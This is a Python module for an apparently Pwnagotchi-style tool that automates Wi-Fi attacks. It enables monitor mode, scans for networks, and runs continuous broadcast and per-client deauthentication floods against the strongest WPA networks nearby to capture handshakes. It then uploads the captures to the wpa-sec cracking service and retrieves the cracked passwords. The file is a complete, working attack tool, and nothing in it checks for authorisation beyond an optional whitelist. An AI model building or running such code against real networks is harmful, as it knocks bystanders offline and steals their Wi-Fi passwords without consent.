#!/usr/bin/env python3
"""
OctapusPrime WiFi Pwnagotchi-like Module
Scans for WiFi networks, captures WPA handshakes via deauthentication,
and submits them to wpa-sec.stanev.org for cracking.
"""

import subprocess
import threading
import logging
import os
import re
import time
import json
import glob

import requests

from pathlib import Path
from queue import Queue

# Directories
BASE_DIR = Path(__file__).resolve().parent
HANDSHAKE_DIR = BASE_DIR / "handshakes"
HANDSHAKE_DIR.mkdir(parents=True, exist_ok=True)
STATE_FILE = HANDSHAKE_DIR / "wifi_state.json"

# WPA-SEC API
WPA_SEC_URL = "https://wpa-sec.stanev.org"
WPA_SEC_UPLOAD = f"{WPA_SEC_URL}/?submit"
WPA_SEC_RESULTS = f"{WPA_SEC_URL}/?api&dl=1"

# Shared log queue (will be set from server.py)
log_queue: Queue = None


def set_log_queue(q: Queue):
    """Set the shared log queue for real-time UI updates."""
    global log_queue
    log_queue = q


def _emit(tool, message):
    """Log and enqueue a message for the web UI."""
    logging.info(f"[{tool}] {message}")
    if log_queue:
        try:
            log_queue.put_nowait({"tool": tool, "line": message})
        except Exception:
            pass


class WiFiPwnManager:
    """Manages WiFi scanning, deauth, handshake capture, and WPA-SEC submission."""

    def __init__(self):
        self.is_running = False
        self.monitor_iface = None
        self.original_iface = None
        self.networks = []
        self.captured_handshakes = []
        self.whitelist = []  # list of whitelisted BSSIDs (lowercase)
        self.current_target = None
        self._stop_event = threading.Event()
        self._process = None
        self._scan_thread = None
        self._spectrum_thread = None
        self._spectrum_stop = threading.Event()
        self.spectrum_running = False
        self.spectrum_data = []  # live signal readings
        self._load_state()

    # ------------------------------------------------------------------
    # State persistence
    # ------------------------------------------------------------------
    def _save_state(self):
        """Persist captured handshakes and networks to disk."""
        try:
            state = {
                "captured_handshakes": self.captured_handshakes,
                "networks": self.networks[:50],
                "whitelist": self.whitelist,
            }
            tmp = str(STATE_FILE) + ".tmp"
            with open(tmp, "w") as f:
                json.dump(state, f, indent=2)
            os.replace(tmp, STATE_FILE)
        except Exception as e:
            logging.warning(f"Failed to save WiFi state: {e}")

    def _load_state(self):
        """Restore state from disk on startup."""
        if not STATE_FILE.exists():
            return
        try:
            with open(STATE_FILE, "r") as f:
                state = json.load(f)
            # Restore handshakes — only keep entries whose cap files still exist
            for hs in state.get("captured_handshakes", []):
                cap = hs.get("file", "")
                if os.path.exists(cap):
                    # Re-verify handshake on load
                    hs["verified"] = self._verify_handshake(cap, hs.get("bssid"))
                    self.captured_handshakes.append(hs)
            self.networks = state.get("networks", [])
            self.whitelist = state.get("whitelist", [])
            if self.captured_handshakes:
                _emit("wifi", f"Restored {len(self.captured_handshakes)} handshake(s) from disk")
        except Exception as e:
            logging.warning(f"Failed to load WiFi state: {e}")

    # ------------------------------------------------------------------
    # Interface management
    # ------------------------------------------------------------------
    def get_wireless_interfaces(self):
        """List wireless interfaces available on the system using multiple methods."""
        interfaces = set()

        # Method 1: /sys/class/net/*/wireless (most reliable on Linux)
        try:
            for iface_path in glob.glob("/sys/class/net/*/wireless"):
                iface = iface_path.split("/")[4]
                interfaces.add(iface)
        except Exception:
            pass

        # Method 2: /proc/net/wireless
        try:
            with open("/proc/net/wireless", "r") as f:
                for line in f.readlines()[2:]:  # skip header lines
                    iface = line.strip().split(":")[0]
                    if iface:
                        interfaces.add(iface)
        except Exception:
            pass

        # Method 3: iw dev
        try:
            result = subprocess.run(
                ["iw", "dev"],
                capture_output=True, text=True, timeout=10
            )
            for line in result.stdout.splitlines():
                line = line.strip()
                if line.startswith("Interface"):
                    interfaces.add(line.split()[1])
        except Exception:
            pass

        # Method 4: iwconfig (catches interfaces the others might miss)
        try:
            result = subprocess.run(
                ["iwconfig"],
                capture_output=True, text=True, timeout=10
            )
            for line in result.stdout.splitlines():
                if "IEEE 802.11" in line or "ESSID" in line:
                    iface = line.split()[0]
                    if iface:
                        interfaces.add(iface)
        except Exception:
            pass

        if not interfaces:
            _emit("wifi", "No wireless interfaces found")
        else:
            _emit("wifi", f"Found wireless interfaces: {', '.join(sorted(interfaces))}")

        return sorted(interfaces)

    def enable_monitor_mode(self, interface):
        """Put *interface* into monitor mode, return the monitor interface name."""
        try:
            _emit("wifi", f"Enabling monitor mode on {interface}...")
            self.original_iface = interface

            # Kill interfering processes
            subprocess.run(
                ["sudo", "airmon-ng", "check", "kill"],
                capture_output=True, text=True, timeout=15
            )

            result = subprocess.run(
                ["sudo", "airmon-ng", "start", interface],
                capture_output=True, text=True, timeout=15
            )

            output = result.stdout + result.stderr
            _emit("wifi", f"airmon-ng output: {output[:300]}")

            mon_iface = None

            # Parse: "(mac80211 monitor mode vif enabled on [phy0]wlan0mon"
            m = re.search(r"monitor mode vif enabled on \[.*?\](\S+)", output)
            if m:
                mon_iface = m.group(1).rstrip(")")

            # Parse: "monitor mode already enabled for [phy0]wlan0mon"
            if not mon_iface:
                m = re.search(r"monitor mode.*enabled.*\[.*?\](\S+)", output)
                if m:
                    mon_iface = m.group(1).rstrip(")")

            # Fallback: check iw dev for any monitor-type interface
            if not mon_iface:
                check = subprocess.run(
                    ["iw", "dev"], capture_output=True, text=True, timeout=10
                )
                current_iface = None
                for line in check.stdout.splitlines():
                    line_s = line.strip()
                    if line_s.startswith("Interface"):
                        current_iface = line_s.split()[1]
                    elif "type monitor" in line_s and current_iface:
                        mon_iface = current_iface
                        break

            if not mon_iface:
                _emit("wifi", "Failed to determine monitor interface name")
                return None

            self.monitor_iface = mon_iface
            _emit("wifi", f"Monitor mode enabled on {mon_iface}")
            return mon_iface

        except Exception as e:
            _emit("wifi", f"Failed to enable monitor mode: {e}")
            return None

    def disable_monitor_mode(self):
        """Restore the original managed-mode interface."""
        iface = self.monitor_iface or self.original_iface
        if not iface:
            return
        try:
            _emit("wifi", f"Disabling monitor mode on {iface}...")
            subprocess.run(
                ["sudo", "airmon-ng", "stop", iface],
                capture_output=True, text=True, timeout=15
            )
            # Restart network manager
            subprocess.run(
                ["sudo", "systemctl", "start", "NetworkManager"],
                capture_output=True, text=True, timeout=10
            )
            self.monitor_iface = None
            _emit("wifi", "Monitor mode disabled")
        except Exception as e:
            _emit("wifi", f"Failed to disable monitor mode: {e}")

    # ------------------------------------------------------------------
    # Scanning
    # ------------------------------------------------------------------
    def scan_networks(self, interface=None, duration=15):
        """
        Run airodump-ng for *duration* seconds and parse CSV output.
        Returns a list of network dicts.
        """
        iface = interface or self.monitor_iface
        if not iface:
            _emit("wifi", "No monitor interface available for scanning")
            return []

        csv_prefix = str(HANDSHAKE_DIR / "scan_result")
        # Remove old scan files (may be root-owned from sudo airodump)
        old_files = glob.glob(f"{csv_prefix}*")
        if old_files:
            subprocess.run(
                ["sudo", "rm", "-f"] + old_files,
                capture_output=True, timeout=5
            )

        _emit("wifi", f"Scanning for networks on {iface} ({duration}s)...")

        try:
            proc = subprocess.Popen(
                [
                    "sudo", "airodump-ng",
                    "--output-format", "csv",
                    "--write", csv_prefix,
                    iface,
                ],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
            time.sleep(duration)
            proc.terminate()
            try:
                stdout, stderr = proc.communicate(timeout=5)
                if stderr:
                    _emit("wifi", f"airodump stderr: {stderr.decode(errors='ignore')[:200]}")
            except subprocess.TimeoutExpired:
                proc.kill()
        except Exception as e:
            _emit("wifi", f"Scan error: {e}")
            return []

        # Parse the CSV — find the actual file (number may vary)
        csv_candidates = sorted(glob.glob(f"{csv_prefix}*.csv"))
        csv_file = csv_candidates[0] if csv_candidates else f"{csv_prefix}-01.csv"

        if not os.path.exists(csv_file):
            _emit("wifi", f"No CSV output file found at {csv_file}")
            return []

        # Read the CSV (may be root-owned)
        try:
            with open(csv_file, "r", errors="ignore") as f:
                csv_content = f.read()
        except PermissionError:
            result = subprocess.run(
                ["sudo", "cat", csv_file],
                capture_output=True, text=True, timeout=5
            )
            csv_content = result.stdout

        _emit("wifi", f"CSV size: {len(csv_content)} bytes")
        networks = self._parse_airodump_csv_content(csv_content)
        self.networks = networks
        self._save_state()
        _emit("wifi", f"Found {len(networks)} networks")
        return networks

    def _parse_airodump_csv_content(self, content):
        """Parse airodump-ng CSV content string into AP list and client associations."""
        networks = []
        if not content or not content.strip():
            return networks

        try:
            # Normalize line endings and split AP / client sections
            content = content.replace("\r\n", "\n")
            sections = re.split(r"\n\s*\n", content, maxsplit=1)
            if not sections:
                return networks

            # --- Parse APs ---
            ap_section = sections[0]
            lines = ap_section.strip().splitlines()

            header_idx = None
            for i, line in enumerate(lines):
                if "BSSID" in line and "ESSID" in line:
                    header_idx = i
                    break

            if header_idx is None:
                return networks

            bssid_to_idx = {}  # map bssid -> index in networks list

            for line in lines[header_idx + 1:]:
                parts = [p.strip() for p in line.split(",")]
                if len(parts) < 14:
                    continue
                bssid = parts[0]
                if not re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", bssid):
                    continue

                try:
                    channel = int(parts[3].strip())
                except ValueError:
                    channel = 0

                try:
                    power = int(parts[8].strip()) if len(parts) > 8 else -1
                except ValueError:
                    power = -1

                encryption = parts[5].strip() if len(parts) > 5 else ""
                essid = parts[13].strip() if len(parts) > 13 else ""

                bssid_to_idx[bssid.upper()] = len(networks)
                networks.append({
                    "bssid": bssid,
                    "essid": essid,
                    "channel": channel,
                    "power": power,
                    "encryption": encryption,
                    "clients": [],
                })

            # --- Parse Clients ---
            if len(sections) > 1:
                client_section = sections[1]
                client_lines = client_section.strip().splitlines()
                for line in client_lines:
                    parts = [p.strip() for p in line.split(",")]
                    if len(parts) < 6:
                        continue
                    client_mac = parts[0]
                    if not re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", client_mac):
                        continue
                    associated_bssid = parts[5].strip().upper() if len(parts) > 5 else ""
                    if associated_bssid in bssid_to_idx:
                        networks[bssid_to_idx[associated_bssid]]["clients"].append(client_mac)

        except Exception as e:
            _emit("wifi", f"CSV parse error: {e}")

        return networks

    # ------------------------------------------------------------------
    # Live Spectrum Scanner (real-time signal monitoring)
    # ------------------------------------------------------------------
    def start_spectrum_scan(self, interface=None, interval=3):
        """
        Start a continuous background airodump-ng scan that refreshes
        signal strength data every *interval* seconds for direction-finding.
        """
        iface = interface or self.monitor_iface
        if not iface:
            _emit("wifi", "No monitor interface for spectrum scan")
            return {"success": False, "message": "No monitor interface"}

        if self.spectrum_running:
            return {"success": False, "message": "Spectrum scan already running"}

        self._spectrum_stop.clear()
        self.spectrum_running = True

        def _spectrum_loop():
            csv_prefix = str(HANDSHAKE_DIR / "spectrum")
            try:
                while not self._spectrum_stop.is_set():
                    # Clean old files
                    old = glob.glob(f"{csv_prefix}*")
                    if old:
                        subprocess.run(
                            ["sudo", "rm", "-f"] + old,
                            capture_output=True, timeout=5,
                        )

                    # Run a quick scan burst
                    proc = subprocess.Popen(
                        [
                            "sudo", "airodump-ng",
                            "--output-format", "csv",
                            "--write", csv_prefix,
                            iface,
                        ],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                    )
                    # Wait for interval
                    for _ in range(interval):
                        if self._spectrum_stop.is_set():
                            break
                        time.sleep(1)
                    proc.terminate()
                    try:
                        proc.communicate(timeout=5)
                    except subprocess.TimeoutExpired:
                        proc.kill()

                    if self._spectrum_stop.is_set():
                        break

                    # Parse the CSV
                    csv_candidates = sorted(glob.glob(f"{csv_prefix}*.csv"))
                    if not csv_candidates:
                        continue

                    csv_file = csv_candidates[0]
                    try:
                        with open(csv_file, "r", errors="ignore") as f:
                            csv_content = f.read()
                    except PermissionError:
                        r = subprocess.run(
                            ["sudo", "cat", csv_file],
                            capture_output=True, text=True, timeout=5,
                        )
                        csv_content = r.stdout

                    networks = self._parse_airodump_csv_content(csv_content)

                    # Build spectrum data: essid, bssid, channel, power, encryption
                    self.spectrum_data = [
                        {
                            "essid": n.get("essid", ""),
                            "bssid": n.get("bssid", ""),
                            "channel": n.get("channel", 0),
                            "power": n.get("power", -100),
                            "encryption": n.get("encryption", ""),
                            "clients": len(n.get("clients", []))
                                       if isinstance(n.get("clients"), list) else 0,
                        }
                        for n in networks
                    ]

            except Exception as e:
                _emit("wifi", f"Spectrum scan error: {e}")
            finally:
                self.spectrum_running = False
                self.spectrum_data = []
                # Clean up
                old = glob.glob(f"{csv_prefix}*")
                if old:
                    subprocess.run(
                        ["sudo", "rm", "-f"] + old,
                        capture_output=True, timeout=5,
                    )

        self._spectrum_thread = threading.Thread(target=_spectrum_loop, daemon=True)
        self._spectrum_thread.start()
        _emit("wifi", "Live spectrum scan started")
        return {"success": True, "message": "Spectrum scan started"}

    def stop_spectrum_scan(self):
        """Stop the live spectrum scanner."""
        self._spectrum_stop.set()
        self.spectrum_running = False
        _emit("wifi", "Spectrum scan stopped")
        return {"success": True, "message": "Spectrum scan stopped"}

    def get_spectrum_data(self):
        """Return current spectrum readings."""
        return {
            "running": self.spectrum_running,
            "networks": sorted(self.spectrum_data,
                               key=lambda n: n["power"], reverse=True),
        }

    # ------------------------------------------------------------------
    # Deauthentication & handshake capture
    # ------------------------------------------------------------------
    def deauth_network(self, bssid, channel, client_macs=None, count=15, rounds=5):
        """
        Send deauth packets to an AP (and optionally specific clients).
        Runs broadcast deauth + targeted per-client deauth for better results.
        """
        iface = self.monitor_iface
        if not iface:
            _emit("wifi", "No monitor interface – enable monitor mode first")
            return False

        # Set channel first
        subprocess.run(
            ["sudo", "iwconfig", iface, "channel", str(channel)],
            capture_output=True, text=True, timeout=5,
        )

        for r in range(rounds):
            if self._stop_event.is_set():
                break

            # Broadcast deauth (kicks everyone)
            _emit("wifi", f"Deauth round {r+1}/{rounds} → {bssid} (broadcast)")
            subprocess.run(
                ["sudo", "aireplay-ng", "--deauth", str(count), "-a", bssid, iface],
                capture_output=True, text=True, timeout=20,
            )

            # Targeted deauth per known client (much more effective)
            if client_macs:
                for cmac in client_macs:
                    if self._stop_event.is_set():
                        break
                    _emit("wifi", f"  Deauth → client {cmac}")
                    subprocess.run(
                        ["sudo", "aireplay-ng", "--deauth", str(count),
                         "-a", bssid, "-c", cmac, iface],
                        capture_output=True, text=True, timeout=20,
                    )

            time.sleep(2)

        return True

    def capture_handshake(self, bssid, channel, essid="", duration=30, client_macs=None):
        """
        Target a specific AP: tune to its channel, start airodump-ng to
        capture the handshake, and continuously deauth in a parallel thread.
        """
        iface = self.monitor_iface
        if not iface:
            _emit("wifi", "No monitor interface – enable monitor mode first")
            return None

        self.current_target = {"bssid": bssid, "essid": essid, "channel": channel}
        cap_prefix = str(HANDSHAKE_DIR / f"hs_{bssid.replace(':', '')}")

        # Remove old capture files for this BSSID (may be root-owned)
        old_caps = glob.glob(f"{cap_prefix}*")
        if old_caps:
            subprocess.run(
                ["sudo", "rm", "-f"] + old_caps,
                capture_output=True, timeout=5
            )

        _emit("wifi", f"Targeting {essid or bssid} on ch {channel} "
              f"({len(client_macs) if client_macs else 0} known clients)...")

        # Set channel
        subprocess.run(
            ["sudo", "iwconfig", iface, "channel", str(channel)],
            capture_output=True, text=True, timeout=5,
        )

        # Start airodump-ng capturing for this BSSID
        airodump = subprocess.Popen(
            [
                "sudo", "airodump-ng",
                "--bssid", bssid,
                "--channel", str(channel),
                "--output-format", "cap",
                "--write", cap_prefix,
                iface,
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Give airodump a moment to start
        time.sleep(2)

        # Continuous deauth in a parallel thread
        deauth_stop = threading.Event()

        def _deauth_loop():
            """Continuously send deauth packets until stopped."""
            round_num = 0
            while not deauth_stop.is_set() and not self._stop_event.is_set():
                round_num += 1
                _emit("wifi", f"Deauth wave {round_num} → {essid or bssid}")

                # Broadcast deauth
                subprocess.run(
                    ["sudo", "aireplay-ng", "--deauth", "15",
                     "-a", bssid, iface],
                    capture_output=True, text=True, timeout=20,
                )

                # Targeted per-client deauth (much more effective)
                if client_macs:
                    for cmac in client_macs[:10]:  # cap at 10 clients
                        if deauth_stop.is_set() or self._stop_event.is_set():
                            return
                        subprocess.run(
                            ["sudo", "aireplay-ng", "--deauth", "10",
                             "-a", bssid, "-c", cmac, iface],
                            capture_output=True, text=True, timeout=15,
                        )

                # Brief pause between waves
                for _ in range(3):
                    if deauth_stop.is_set() or self._stop_event.is_set():
                        return
                    time.sleep(1)

        deauth_thread = threading.Thread(target=_deauth_loop, daemon=True)
        deauth_thread.start()

        # Wait for the capture duration
        for _ in range(duration):
            if self._stop_event.is_set():
                break
            time.sleep(1)

        # Stop deauth and airodump
        deauth_stop.set()
        deauth_thread.join(timeout=5)
        airodump.terminate()
        try:
            airodump.wait(timeout=5)
        except subprocess.TimeoutExpired:
            airodump.kill()

        # Check for captured handshake
        cap_candidates = sorted(glob.glob(f"{cap_prefix}*.cap"))
        cap_file = cap_candidates[0] if cap_candidates else None
        has_handshake = cap_file and self._verify_handshake(cap_file, bssid)

        if cap_file:
            # Avoid duplicate records for the same BSSID
            existing = next(
                (h for h in self.captured_handshakes
                 if h["bssid"].lower() == bssid.lower()),
                None,
            )
            if existing:
                existing["file"] = cap_file
                existing["timestamp"] = time.strftime("%Y-%m-%d %H:%M:%S")
                existing["verified"] = has_handshake
                if has_handshake:
                    existing["submitted"] = False  # new valid capture, needs re-submit
                self._save_state()
                if has_handshake:
                    _emit("wifi", f"✓ Valid handshake captured for {essid or bssid}!")
                else:
                    _emit("wifi", f"Capture saved for {essid or bssid} — no valid handshake yet")
                return existing

            hs_record = {
                "bssid": bssid,
                "essid": essid,
                "file": cap_file,
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                "submitted": False,
                "cracked": False,
                "password": None,
                "verified": has_handshake,
            }
            self.captured_handshakes.append(hs_record)
            self._save_state()
            if has_handshake:
                _emit("wifi", f"✓ Valid handshake captured for {essid or bssid}!")
            else:
                _emit("wifi", f"Capture saved for {essid or bssid} — no valid handshake yet")
            return hs_record

        _emit("wifi", f"No capture file generated for {essid or bssid}")
        self.current_target = None
        return None

    def _verify_handshake(self, cap_file, bssid):
        """Use aircrack-ng to verify a captured handshake."""
        try:
            cmd = ["sudo", "aircrack-ng", cap_file]
            if bssid:
                cmd.extend(["-b", bssid])
            result = subprocess.run(
                cmd,
                capture_output=True, text=True, timeout=15,
            )
            output = result.stdout + result.stderr
            if "1 handshake" in output.lower() or "wpa (" in output.lower():
                return True
        except Exception:
            pass
        return False

    # ------------------------------------------------------------------
    # WPA-SEC integration
    # ------------------------------------------------------------------
    def submit_to_wpasec(self, cap_file, api_key):
        """Upload a .cap file to wpa-sec.stanev.org (once per file)."""
        if not api_key:
            _emit("wifi", "WPA-SEC API key not configured")
            return {"success": False, "message": "API key not configured"}

        if not os.path.exists(cap_file):
            _emit("wifi", f"Capture file not found: {cap_file}")
            return {"success": False, "message": "File not found"}

        # Guard: skip if already submitted
        hs_rec = next(
            (h for h in self.captured_handshakes
             if h["file"] == cap_file and h["submitted"]),
            None,
        )
        if hs_rec:
            _emit("wifi", f"{os.path.basename(cap_file)} already submitted — skipping")
            return {"success": True, "message": "Already submitted"}

        # Validate: ensure file contains a valid WPA handshake
        if not self._verify_handshake(cap_file, None):
            _emit("wifi", f"No valid handshake in {os.path.basename(cap_file)} — not submitting")
            return {"success": False, "message": "No valid handshake found in capture file"}

        _emit("wifi", f"Submitting {os.path.basename(cap_file)} to WPA-SEC...")

        try:
            with open(cap_file, "rb") as f:
                resp = requests.post(
                    WPA_SEC_UPLOAD,
                    files={"file": (os.path.basename(cap_file), f, "application/octet-stream")},
                    cookies={"key": api_key},
                    timeout=60,
                )

            if resp.status_code == 200:
                body = resp.text.strip()
                # Mark submitted in our records
                for h in self.captured_handshakes:
                    if h["file"] == cap_file:
                        h["submitted"] = True
                        break
                _emit("wifi", f"✓ Submitted to WPA-SEC: {body}")
                self._save_state()
                return {"success": True, "message": body}
            else:
                msg = f"WPA-SEC upload failed (HTTP {resp.status_code})"
                _emit("wifi", msg)
                return {"success": False, "message": msg}

        except Exception as e:
            msg = f"WPA-SEC upload error: {e}"
            _emit("wifi", msg)
            return {"success": False, "message": msg}

    def check_wpasec_results(self, api_key):
        """Download cracked results from WPA-SEC."""
        if not api_key:
            return {"success": False, "message": "API key not configured"}

        try:
            resp = requests.get(
                WPA_SEC_RESULTS,
                cookies={"key": api_key},
                timeout=30,
            )
            if resp.status_code == 200:
                results = []
                for line in resp.text.strip().splitlines():
                    parts = line.split(":")
                    if len(parts) >= 3:
                        results.append({
                            "bssid": parts[0],
                            "essid": parts[1],
                            "password": ":".join(parts[2:]),
                        })
                        # Update local records
                        for hs in self.captured_handshakes:
                            if hs["bssid"].lower() == parts[0].lower():
                                hs["cracked"] = True
                                hs["password"] = ":".join(parts[2:])

                self._save_state()

                _emit("wifi", f"WPA-SEC: {len(results)} cracked networks found")
                return {"success": True, "results": results}
            else:
                return {"success": False, "message": f"HTTP {resp.status_code}"}

        except Exception as e:
            return {"success": False, "message": str(e)}

    # ------------------------------------------------------------------
    # Automated hunt (Pwnagotchi-style loop)
    # ------------------------------------------------------------------
    def start_auto_hunt(self, interface, api_key, scan_duration=15, capture_duration=30):
        """
        Automated loop: scan → pick best target → deauth → capture → submit.
        Runs in a background thread.
        """
        if self.is_running:
            return {"success": False, "message": "Hunt already running"}

        self._stop_event.clear()
        self.is_running = True

        def _hunt():
            try:
                mon = self.enable_monitor_mode(interface)
                if not mon:
                    self.is_running = False
                    return

                while not self._stop_event.is_set():
                    networks = self.scan_networks(duration=scan_duration)

                    # Filter to WPA/WPA2 only and sort by signal strength
                    wpa_nets = [
                        n for n in networks
                        if "WPA" in n.get("encryption", "").upper()
                        and n.get("essid")
                    ]
                    wpa_nets.sort(key=lambda n: n["power"], reverse=True)

                    if not wpa_nets:
                        _emit("wifi", "No WPA networks found, rescanning...")
                        continue

                    for net in wpa_nets[:3]:  # Top 3 strongest
                        if self._stop_event.is_set():
                            break

                        # Skip whitelisted APs
                        if net["bssid"].lower() in self.whitelist:
                            _emit("wifi", f"Skipping whitelisted AP: {net['essid']} ({net['bssid']})")
                            continue

                        # Skip already captured
                        already = any(
                            h["bssid"].lower() == net["bssid"].lower()
                            for h in self.captured_handshakes
                        )
                        if already:
                            continue

                        # Extract known clients for this AP
                        client_macs = net.get("clients", [])
                        if isinstance(client_macs, int):
                            client_macs = []

                        _emit("wifi", f"Auto-hunt targeting {net['essid']} "
                              f"({net['bssid']}) - {len(client_macs)} clients")

                        hs = self.capture_handshake(
                            net["bssid"], net["channel"],
                            net["essid"], capture_duration,
                            client_macs=client_macs
                        )
                        if hs and api_key:
                            self.submit_to_wpasec(hs["file"], api_key)
                            hs["submitted"] = True

                    # Brief pause between rounds
                    for _ in range(10):
                        if self._stop_event.is_set():
                            break
                        time.sleep(1)

            except Exception as e:
                _emit("wifi", f"Auto-hunt error: {e}")
            finally:
                self.disable_monitor_mode()
                self.is_running = False
                _emit("wifi", "Auto-hunt stopped")

        self._scan_thread = threading.Thread(target=_hunt, daemon=True)
        self._scan_thread.start()
        return {"success": True, "message": "Auto-hunt started"}

    def stop(self):
        """Stop any running WiFi operation."""
        self._stop_event.set()
        self.is_running = False
        if self.spectrum_running:
            self.stop_spectrum_scan()
        _emit("wifi", "Stop signal sent")
        return {"success": True, "message": "Stop signal sent"}

    # ------------------------------------------------------------------
    # Status
    # ------------------------------------------------------------------
    def get_status(self):
        """Return current state for the frontend."""
        return {
            "is_running": self.is_running,
            "monitor_iface": self.monitor_iface,
            "original_iface": self.original_iface,
            "current_target": self.current_target,
            "networks_found": len(self.networks),
            "networks": self.networks[:50],
            "spectrum_running": self.spectrum_running,
            "whitelist": self.whitelist,
            "handshakes": [
                {
                    "bssid": h["bssid"],
                    "essid": h["essid"],
                    "timestamp": h["timestamp"],
                    "submitted": h["submitted"],
                    "cracked": h["cracked"],
                    "password": h["password"],
                    "verified": h.get("verified", False),
                }
                for h in self.captured_handshakes
            ],
        }

    # ------------------------------------------------------------------
    # Whitelist management
    # ------------------------------------------------------------------
    def whitelist_add(self, bssid):
        """Add a BSSID to the whitelist."""
        b = bssid.lower().strip()
        if b not in self.whitelist:
            self.whitelist.append(b)
            self._save_state()
            _emit("wifi", f"Whitelisted AP: {bssid}")
        return {"success": True, "whitelist": self.whitelist}

    def whitelist_remove(self, bssid):
        """Remove a BSSID from the whitelist."""
        b = bssid.lower().strip()
        if b in self.whitelist:
            self.whitelist.remove(b)
            self._save_state()
            _emit("wifi", f"Removed from whitelist: {bssid}")
        return {"success": True, "whitelist": self.whitelist}


# Singleton instance
wifi_manager = WiFiPwnManager()
